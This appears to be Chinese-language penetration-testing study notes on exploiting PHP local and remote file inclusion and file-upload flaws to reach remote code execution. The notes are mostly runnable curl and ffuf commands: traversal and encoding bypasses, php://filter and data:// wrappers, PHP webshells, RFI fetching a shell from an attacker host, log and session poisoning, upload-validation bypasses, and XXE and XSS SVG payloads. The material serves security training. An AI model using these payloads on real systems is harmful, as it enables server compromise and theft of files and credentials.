## 學習目標

- 能識別 LFI/RFI 觸發參數並逐步測試路徑控制程度。
- 掌握 path traversal、PHP wrapper、Log Poisoning 的實際指令。
- 理解檔案上傳驗證繞過（副檔名/MIME/magic bytes）。
- 知道 LFI + 上傳如何串成 RCE 鏈。
- 能用 ffuf 自動化掃描 LFI 參數與路徑。

## 理論基礎：LFI 成因

```php
// 典型 PHP 弱點模式
include($_GET['language']);                          // 直接控制路徑
include("./languages/" . $_GET['language']);         // 有前綴拼接
include($_GET['language'] . ".php");                 // 有後綴附加
```

| 能力層級 | 說明 | 對應技巧 |
|---------|------|---------|
| 讀取本地檔案 | 直接讀 /etc/passwd 等 | 絕對路徑、traversal |
| 讀取 PHP 原始碼 | include 會執行 PHP | php://filter base64 |
| 遠端包含 | RFI → 執行遠端腳本 | http:// (需 allow_url_include) |
| Log Poisoning | 汙染日誌 → LFI 執行 | User-Agent 注入 |
| 上傳 + LFI | 上傳 webshell → LFI 包含 | 結合兩個漏洞 |

## 方法一：LFI 基本路徑測試

```bash
# 識別 LFI 參數（常見名稱）
# page= / file= / path= / language= / template= / view= / include=

# 步驟 1：測試絕對路徑
curl -s "http://TARGET/index.php?language=/etc/passwd"
# 若回應包含 root:x:0:0 → LFI 確認

# 步驟 2：若有前綴（./languages/ 被拼在前面）→ path traversal
curl -s "http://TARGET/index.php?language=../../../../etc/passwd"
# 從當前目錄回跳多層 → 到達 /etc/passwd
# 通常 4-5 個 ../ 就夠，但不確定時多加幾層也沒關係

# 步驟 3：若有後綴附加（.php 被拼在後面）
# 舊版 PHP（< 5.5）：可用 NULL byte 截斷
curl -s "http://TARGET/index.php?language=../../../../etc/passwd%00"
# %00 → URL 編碼的 NULL byte → 截斷 .php 後綴（已修補）

# 步驟 4：讀取 PHP 原始碼（include 會執行 PHP，無法直接讀）
curl -s "http://TARGET/index.php?language=php://filter/read=convert.base64-encode/resource=config"
# php://filter → PHP Stream Wrapper
# convert.base64-encode → 把檔案內容 base64 編碼後輸出（不執行）
# resource=config → 目標檔案（自動補 .php 變成 config.php）

# 解碼 base64 輸出
curl -s "http://TARGET/index.php?language=php://filter/read=convert.base64-encode/resource=config" \
  | grep -o 'PD9[a-zA-Z0-9+/=]*' \
  | base64 -d
# grep 抓 base64 開頭的字串（PD9 = <?p 的 base64）
# base64 -d → 解碼得到原始 PHP 程式碼

# Windows 常見敏感路徑
curl -s "http://TARGET/index.php?language=../../../../windows/system32/drivers/etc/hosts"
curl -s "http://TARGET/index.php?language=../../../../boot.ini"
```

## 方法二：繞過過濾器

```bash
# 繞過 ../ 被取代（非遞迴過濾）
curl -s "http://TARGET/index.php?language=....//....//....//etc/passwd"
# ....// → 取代掉 ../ 後剩下 ../（繞過一次性取代）

# URL 編碼繞過
curl -s "http://TARGET/index.php?language=%2e%2e%2f%2e%2e%2fetc%2fpasswd"
# %2e = . ，%2f = / → ../../../etc/passwd 的 URL 編碼

# Double encoding
curl -s "http://TARGET/index.php?language=%252e%252e%252fetc%252fpasswd"
# %25 = % → %252e = %2e（在 server 解第二次）

# 白名單路徑繞過（需以允許的目錄開頭）
curl -s "http://TARGET/index.php?language=./languages/../../../../etc/passwd"
# 先滿足前綴白名單 ./languages/，再用 ../ 跳出

# 若後端用 basename() 只取檔名，無法 traversal
# 改用 php://filter 讀當前目錄的 PHP 檔
curl -s "http://TARGET/index.php?language=php://filter/read=convert.base64-encode/resource=index"
```

## 方法三：PHP Wrapper（進階）

```bash
# 1. php://filter（讀原始碼）
curl -s "http://TARGET/index.php?language=php://filter/read=convert.base64-encode/resource=../config"

# 2. data:// wrapper（需 allow_url_include=On）
# 把 PHP code 直接用 data:// 傳入
echo "<?php system(\$_GET['cmd']); ?>" | base64
# → PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==

curl -s "http://TARGET/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+Cg==&cmd=id"
# data://text/plain;base64, → 以 base64 格式傳入純文字 data
# 若 PHP include 這個 wrapper → 執行 PHP code
# &cmd=id → 觸發 webshell 的 cmd 參數

# 3. php://input（POST body 作為 PHP code）
curl -s "http://TARGET/index.php?language=php://input" \
  --data "<?php system('id'); ?>"
# php://input → 把 POST body 當成 include 的內容
# 若 allow_url_include=On → 直接執行 POST body 中的 PHP
```

## 方法四：Remote File Inclusion（RFI）

```bash
# 確認是否支援 RFI（allow_url_include）
# 先測本地 URL
curl -s "http://TARGET/index.php?language=http://127.0.0.1/test.txt"
# 若有回應 → URL include 支援

# 在攻擊機準備惡意 PHP shell
echo "<?php system(\$_GET['cmd']); ?>" > /tmp/shell.php
# 開 HTTP server
python3 -m http.server 8000
# → 監聽在 http://ATTACKER_IP:8000/shell.php

# 注入 RFI
curl -s "http://TARGET/index.php?language=http://ATTACKER_IP:8000/shell.php&cmd=id"
# → 目標伺服器抓取 shell.php 並執行
# → 回應包含 uid=33(www-data)...

# FTP 協定（若 HTTP 被擋）
# python3 -m pyftpdlib -p 21  → 架 FTP server
curl -s "http://TARGET/index.php?language=ftp://ATTACKER_IP/shell.php&cmd=id"
```

## 方法五：Log Poisoning（日誌汙染）

```bash
# 原理：汙染日誌檔（注入 PHP code）→ LFI 包含日誌 → 執行
# 需要：知道日誌路徑 + 有 LFI 能讀日誌

# 步驟 1：汙染 Apache access log（User-Agent 注入）
curl -s http://TARGET/ \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
# User-Agent 會被寫入 access log
# /var/log/apache2/access.log 或 /proc/self/fd/2（Apache error log）

# 步驟 2：用 LFI 包含汙染後的日誌
curl -s "http://TARGET/index.php?language=../../../../var/log/apache2/access.log&cmd=id"
# → LFI 讀 access.log → log 中有 PHP code → 被執行
# → 回應包含 id 指令輸出

# Nginx log 路徑
curl -s "http://TARGET/index.php?language=../../../../var/log/nginx/access.log&cmd=id"

# PHP Session 汙染
# 步驟 1：設定含 PHP code 的 session 值
curl -s http://TARGET/index.php \
  -d "language=<?php system(\$_GET['cmd']); ?>" \
  -b "PHPSESSID=mytest123"
# 若 session 值被寫入 session 檔案 /var/lib/php/sessions/sess_mytest123

# 步驟 2：LFI 包含 session 檔案
curl -s "http://TARGET/index.php?language=../../../../var/lib/php/sessions/sess_mytest123&cmd=id"

# 常見日誌路徑
# Apache：/var/log/apache2/access.log
# Nginx：/var/log/nginx/access.log
# PHP session：/var/lib/php/sessions/sess_<SESSIONID>
# /tmp/sess_<SESSIONID>（部分設定）
```

## 方法六：ffuf 自動化 LFI 掃描

```bash
# 掃常見 LFI 參數名稱（找到可控參數）
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -u "http://TARGET/index.php?FUZZ=../../../../etc/passwd" \
  -fs BASELINE_SIZE
# FUZZ → 嘗試各種參數名稱
# ../../../../etc/passwd → 路徑測試 payload
# -fs BASELINE_SIZE → 過濾掉正常頁面大小（先用任意參數取得基準）

# 掃 LFI 路徑（已知參數，掃路徑）
ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
  -u "http://TARGET/index.php?language=FUZZ" \
  -fs BASELINE_SIZE
# LFI wordlist 包含常見敏感檔案路徑與繞過變形
```

## 方法七：檔案上傳基本測試

```bash
# 步驟 1：上傳正常圖片確認功能
curl -s -X POST http://TARGET/upload \
  -F "file=@test.png;type=image/png"
# -F → multipart/form-data 格式
# file=@test.png → 從本地讀取 test.png
# type=image/png → 設定 Content-Type

# 步驟 2：嘗試上傳 PHP webshell
echo "<?php system(\$_GET['cmd']); ?>" > shell.php
curl -s -X POST http://TARGET/upload \
  -F "file=@shell.php;type=image/png"
# 改 Content-Type 為 image/png → 若後端只看 MIME 不看內容 → 通過
# 觀察回應：是否有上傳路徑

# 步驟 3：存取上傳的 shell
curl -s "http://TARGET/uploads/shell.php?cmd=id"
# 若回應包含 uid=33(www-data) → Webshell 執行成功
```

## 方法八：上傳驗證繞過

```bash
# 繞過 1：副檔名黑名單繞過
# 試其他可執行副檔名
# PHP：.php / .php2 / .php3 / .php4 / .php5 / .phtml / .phar
curl -s -X POST http://TARGET/upload \
  -F "file=@shell.phtml;type=image/png"
# phtml → 某些 PHP 設定仍會執行

# 繞過 2：大小寫繞過（部分黑名單大小寫敏感）
curl -s -X POST http://TARGET/upload \
  -F "file=@shell.PhP;type=image/png"

# 繞過 3：雙副檔名
curl -s -X POST http://TARGET/upload \
  -F "file=@shell.png.php;type=image/png"
# 某些 Apache 設定會執行最後的副檔名

# 繞過 4：魔術位元組偽裝（後端檢查 magic bytes）
# GIF header → GIF89a
printf 'GIF89a<?php system($_GET["cmd"]); ?>' > shell_gif.php
curl -s -X POST http://TARGET/upload \
  -F "file=@shell_gif.php;type=image/gif"
# 檔案開頭是 GIF89a（GIF magic bytes）→ MIME 偵測認為是 GIF
# 副檔名仍是 .php → Apache/PHP 執行

# 繞過 5：Content-Type 竄改
# Burp 抓到上傳請求後修改：
# Content-Disposition: form-data; name="file"; filename="shell.php"
# Content-Type: image/jpeg   ← 改這行
# [shell PHP code]
# → 後端若只看 Content-Type 不看實際內容 → 通過

# 上傳後找路徑
# 1. 回應中的 URL
# 2. 頁面中的圖片路徑
# 3. ffuf 猜 /uploads/ 目錄
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -u "http://TARGET/uploads/FUZZ.php" \
  -mc 200
# 掃 uploads 目錄下的 PHP 檔案
```

## 方法九：SVG/XML 類上傳

```bash
# SVG 上傳 → 可能 XXE 或 Stored XSS
cat > evil.svg << 'EOF'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
EOF
# SVG 是 XML → 若 server 解析 SVG → 觸發 XXE

curl -s -X POST http://TARGET/upload \
  -F "file=@evil.svg;type=image/svg+xml"
# type=image/svg+xml → SVG 的正確 MIME
# 若 server 處理後在頁面顯示 → 可能含 /etc/passwd 內容

# SVG XSS
cat > xss.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(window.origin)">
  <circle r="100"/>
</svg>
EOF
curl -s -X POST http://TARGET/upload \
  -F "file=@xss.svg;type=image/svg+xml"
# 若 SVG 被瀏覽器直接渲染 → onload 觸發 XSS
```

## LFI 快速決策流程

```
發現 ?page= / ?file= / ?language= 類參數
    ↓
測試 /etc/passwd（絕對路徑）
    ├─ 成功 → LFI 確認，繼續讀敏感檔
    └─ 失敗 → 試 ../../../../etc/passwd（traversal）
        ├─ 成功 → traversal 有效
        └─ 失敗 → 試各種編碼繞過 / php://filter

有後綴附加（.php）
    └─ 用 php://filter/read=convert.base64-encode/resource=filename
       → 讀 PHP 原始碼（不執行）

有上傳功能 + LFI
    └─ 上傳包含 PHP code 的檔案 → 用 LFI 包含 → RCE

沒有上傳功能
    └─ Log Poisoning：汙染 access.log User-Agent → LFI 讀 log → RCE
```
